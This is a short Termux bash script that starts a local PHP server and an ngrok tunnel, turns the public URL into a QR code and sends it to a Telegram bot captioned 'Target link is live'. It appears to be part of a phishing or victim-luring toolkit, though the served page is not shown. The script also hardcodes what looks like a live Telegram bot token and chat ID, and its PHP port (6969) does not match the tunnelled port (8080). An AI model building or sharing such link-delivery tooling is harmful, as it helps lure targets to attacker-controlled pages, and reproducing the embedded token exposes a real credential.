#!/data/data/com.termux/files/usr/bin/bash

echo -e "\e[1;32m[+] Installing dependencies...\e[0m"
pkg install -y php curl jq termux-api qrencode unzip

echo -e "\e[1;32m[+] Starting PHP server...\e[0m"
php -S 127.0.0.1:6969 > /dev/null 2>&1 &

echo -e "\e[1;32m[+] Starting ngrok...\e[0m"
nohup ngrok http 8080 > /dev/null 2>&1 &

sleep 6
NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[] | select(.proto=="http") | .public_url')

if [[ "$NGROK_URL" == "" || "$NGROK_URL" == "null" ]]; then
    echo -e "\e[1;31m[-] Ngrok URL not found. Is ngrok running?\e[0m"
    exit 1
fi

echo -e "\e[1;32m[+] Ngrok URL:\e[0m $NGROK_URL"
echo -e "\e[1;32m[+] Generating QR Code...\e[0m"
qrencode -o qrcode.png "$NGROK_URL"

echo -e "\e[1;32m[+] Sending to Telegram...\e[0m"

BOT_TOKEN="8128619794:AAGhkVx-64tgJeoSXB_VDSQk7LnZa0ECJcI"
CHAT_ID="5548654620"

curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" \
  -F chat_id="$CHAT_ID" \
  -F photo="@qrcode.png" \
  -F caption="Target link is live: $NGROK_URL"

echo -e "\e[1;32m[+] DONE. QR sent to Telegram.\e[0m"
